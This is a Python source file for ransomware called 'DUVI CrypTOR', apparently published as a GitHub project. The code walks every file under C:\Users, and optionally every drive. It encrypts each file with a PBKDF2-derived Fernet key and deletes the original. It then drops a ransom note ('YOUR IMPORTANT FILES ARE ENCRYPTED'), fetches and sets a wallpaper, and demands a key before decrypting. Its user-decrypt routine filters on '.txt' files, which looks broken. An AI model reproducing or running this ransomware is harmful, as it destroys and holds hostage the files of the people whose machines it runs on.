
# ╔╦╗ ╦ ╦ ╦  ╦ ╦ #
#  ║║ ║ ║ ╚╗╔╝ ║ #
# ═╩╝ ╚═╝  ╚╝  ╩ #


#███╗   ███╗███████╗███╗   ██╗███████╗███████╗ █████╗ ██╗   ██╗
#████╗ ████║██╔════╝████╗  ██║██╔════╝██╔════╝██╔══██╗╚██╗ ██╔╝
#██╔████╔██║█████╗  ██╔██╗ ██║█████╗  ███████╗███████║ ╚████╔╝ 
#██║╚██╔╝██║██╔══╝  ██║╚██╗██║██╔══╝  ╚════██║██╔══██║  ╚██╔╝  
#██║ ╚═╝ ██║███████╗██║ ╚████║███████╗███████║██║  ██║   ██║   
#╚═╝     ╚═╝╚══════╝╚═╝  ╚═══╝╚══════╝╚══════╝╚═╝  ╚═╝   ╚═╝   
                                                              
###          ###
### END USER ###
###          ###
   
import os
import base64

from urllib import request
from ctypes import windll
from random import choice
from sys import argv
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC



def encrypt(password_en, file_path_en):
    
    with open(file_path_en, 'rb') as file:
        file_data = file.read()

    #######################    encrypt    #########################
    salt = os.urandom(16)
    kdf = PBKDF2HMAC(
        algorithm=hashes.SHA256(),
        length=32,
        salt=salt,
        iterations=100000
    )
    key = base64.urlsafe_b64encode(kdf.derive(password_en.encode()))

    fernet = Fernet(key)
    encrypted_data = fernet.encrypt(file_data)
    ###############################################################
    
    encrypted_file_path = file_path_en + '.DUVI'
    
    with open(encrypted_file_path, 'wb') as encrypted_file:
            encrypted_file.write(salt + encrypted_data)
    


def decrypt(password_de, file_path_de):

    for dir_name_de, y, current_dir_de in os.walk(file_path_de):
            for file in current_dir_de:

                    file_and_dir = dir_name_de+"\\"+file

                    with open(file_and_dir, 'rb') as encrypted_file_de:
                        salt_de = encrypted_file_de.read(16)
                        encrypted_data_de = encrypted_file_de.read()

                    ###################      decrypt     ########################                    
                    kdf = PBKDF2HMAC(
                        algorithm=hashes.SHA256(),
                        length=32,
                        salt=salt_de,
                        iterations=100000
                    )
                    key_de = base64.urlsafe_b64encode(kdf.derive(password_de.encode()))

                    fernet = Fernet(key_de)
                    decrypted_data = fernet.decrypt(encrypted_data_de)
                    ##############################################################

                    os.remove(file_and_dir)
                    decrypted_file_path = file_and_dir[:-5]
                    
                    
                    with open(decrypted_file_path, 'wb') as decrypted_file:
                            decrypted_file.write(decrypted_data)




def danger():

    def generate_key():

        global random_key_0

        string_az = ['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z']
        string_AZ = ['A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z']
        string_09 = ['0', '1', '2', '3', '4', '5', '6', '7', '8', '9']
        string_2330 = ['23', '24', '25', '26', '27', '28', '29', '30']; int_2330 = int(choice(string_2330))
        
        random_key_0 = ""

        for x in range(int_2330):
            random_list = choice(['0', '1', '2'])
            if random_list == "0": random_key_0 += choice(string_az)
            if random_list == "1": random_key_0 += choice(string_AZ)
            if random_list == "2": random_key_0 += choice(string_09)

    generate_key()

    with open(argv[0][:-16]+"\\KEY_duvi.txt", "w") as write_key_to_file:
        write_key_to_file.write(random_key_0)


    #print("Danger Key: "+ random_key_0) ###TEMP###


    drivers = ['A:\\', 'B:\\', 'D:\\', 'E:\\', 'F:\\', 'G:\\', 'H:\\', 'I:\\', 'J:\\', 'K:\\', 'L:\\', 'M:\\', 'N:\\', 'O:\\', 'P:\\', 'Q:\\', 'R:\\', 'S:\\', 'T:\\', 'U:\\', 'V:\\', 'W:\\', 'X:\\', 'Y:\\', 'Z:\\']
    drivers_for_attack = list()

    def driver_check(driver_name):
        try: 
            os.chdir(driver_name)
            return True
        except:
            return False

    for driver in drivers:
        if driver_check(driver) == True:
            drivers_for_attack.append(driver)
        


    ### PROTECTED FILES ###

    def protected_files(check_file):

        protected_files_list = list()
        protected_files_list.append("README_duvi.txt")
        protected_files_list.append("KEY_duvi.txt")
        protected_files_list.append("duvi_bg.png")
        protected_files_list.append("DUVIcrypT0R.exe")
        protected_files_list.append("DUVIcrypTOR.exe")

        if check_file in protected_files_list:
            return True



    ### DRIVERS ##

    def attack_to_driver():
        
        string_drivers_for_attack = ""
        for i in drivers_for_attack: string_drivers_for_attack += i

        for driver_for_attack in drivers_for_attack:
            for dir_name_danger, y, current_dir_danger in os.walk(driver_for_attack):
                for file in current_dir_danger:
                    if not file.endswith(".DUVI") and not protected_files(file) == True:

                        file_and_dir = dir_name_danger+"\\"+file

                        try:
                            encrypt(random_key_0, dir_name_danger+"\\"+file)
                            os.remove(file_and_dir)
                
                            print("File: "+file_and_dir+" encrypted")
                        except Exception as e:
                            print(str(e) + ": "+file_and_dir)


    ### USERS ###

    def attack_to_users():

        for dir_name_danger, y, current_dir_danger in os.walk("C:\\Users"):
                for file in current_dir_danger:
                    if not file.endswith(".DUVI") and not protected_files(file) == True:

                        file_and_dir = dir_name_danger+"\\"+file

                        if not "Romaing" in dir_name_danger and not "AppData" in dir_name_danger and not ".vscode" in dir_name_danger:

                            try:
                                encrypt(random_key_0, dir_name_danger+"\\"+file)
                                os.remove(file_and_dir)

                                print("File: "+file_and_dir+" encrypted")
                            except Exception as e:
                                print(str(e) + ": "+file_and_dir)



    ### DECRYPT DRIVERS ###

    def decrypt_drivers():            

        string_drivers_for_attack = ""
        for i in drivers_for_attack: string_drivers_for_attack += i

        for driver_for_decrypt in drivers_for_attack:
            for dir_name_danger, y, current_dir_danger in os.walk(driver_for_decrypt):
                for file in current_dir_danger:
                    if file.endswith(".DUVI") and not protected_files(file) == True:

                        file_and_dir = dir_name_danger+"\\"+file

                        try:
                            decrypt(random_key_0, dir_name_danger+"\\"+file)
                            print("File: "+file_and_dir+" decrypted")
                        except Exception as e:
                            print(str(e) + ": "+file_and_dir)



    ### DECRYPT USERS ###

    def decrypt_users():
        
        for dir_name_danger, y, current_dir_danger in os.walk("C:\\Users"):
                for file in current_dir_danger:
                    if file.endswith(".txt") and not protected_files(file) == True:

                        file_and_dir = dir_name_danger+"\\"+file

                        if not "Romaing" in dir_name_danger and not "AppData" in dir_name_danger and not ".vscode" in dir_name_danger:

                            try:
                                decrypt(random_key_0, dir_name_danger+"\\"+file)
                                print("File: "+file_and_dir+" decrypted")
                            except Exception as e:
                                print(str(e) + ": " +file_and_dir)




    ### ASK KEY ###
    
    def ask_key():

        get_ask_key = str(input("ENTER KEY FOR DECRYPT: "))

        if get_ask_key == random_key_0:

            print("Decrypting...")
            decrypt_users()
            #decrypt_drivers()
        else:

            print("Wrong KEY")
            ask_key()



    def attack_start():

        attack_to_users()
        #attack_to_driver()
        ask_key()



    attack_start()


def banner():

    global duvi_banner
    duvi_banner = ""
    duvi_banner += "╔╦╗ ╦ ╦ ╦  ╦ ╦  ╔═╗ ╦═╗ ╦ ╦ ╔═╗ ╔╦╗ ╔═╗ ╦═╗\n"
    duvi_banner += " ║║ ║ ║ ╚╗╔╝ ║  ║   ╠╦╝ ╚╦╝ ╠═╝  ║  ║ ║ ╠╦╝\n"
    duvi_banner += "═╩╝ ╚═╝  ╚╝  ╩  ╚═╝ ╩╚═  ╩  ╩    ╩  ╚═╝ ╩╚═\n"

    print(duvi_banner)



def change_background():
    
    request.urlretrieve("https://github.com/Menesay/Python-Ransomware/blob/main/duvi_bg.png", argv[0][:-16]+"\\duvi_bg.png")
    windll.user32.SystemParametersInfoW(20, 0, argv[0][:-16]+"\\duvi_bg.png", 3)


def main():

    banner()

    with open(argv[0][:-16]+"\\README_duvi.txt", "w") as readme_file:
        readme_file.write("\n\n\tOOOPS, YOUR IMPORTANT FILES ARE ENCRYPTED!\n\n\tOpen DUVICrypT0R.exe and enter the key for decrypt.")
        readme_file.close()
    
    change_background()

    danger()

if __name__ == '__main__':
    main()
